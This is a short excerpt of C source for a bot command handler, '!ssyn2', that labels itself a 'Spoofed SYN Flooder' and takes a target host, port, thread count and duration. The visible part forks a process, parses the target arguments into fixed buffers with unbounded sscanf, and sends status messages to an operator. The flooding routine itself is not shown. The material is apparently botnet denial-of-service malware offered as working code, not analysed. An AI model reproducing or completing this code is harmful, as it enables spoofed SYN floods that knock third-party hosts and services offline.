...
int ssyn2(char *s)
{
	...
	if (child_pid > 0) {
		...
		//	  if(s < 4){
		//	  AdmSend("Invalid parameters!\n");
		//	  AdmSend("Spoofed SYN Flooder v1.6.1 FINAL by ohnoes1479\nUsage: !ssyn2 <target IP/hostname> <port to be flooded> <number threads to use> <time (optional)>\n");
		//	  exit(-1);
		//	 }


		char i1[128]= "", i2[128]= "", i3[128]= "", i4[128]= "";
		char *text = s;
		sscanf(text, "%s %s %s %s", &i1, &i2, &i3, &i4);

		time(&my_time);
		time_real = localtime(&my_time);
		AdmSend("%s\nSpoofed SYN Flooder v1.6.1 FINAL by ohnoes1479\n",asctime(time_real));
		AdmSend("Setting up Sockets...\n");
		//	AdmSend("%s %s %s %s",i1, i2, i3, i4);
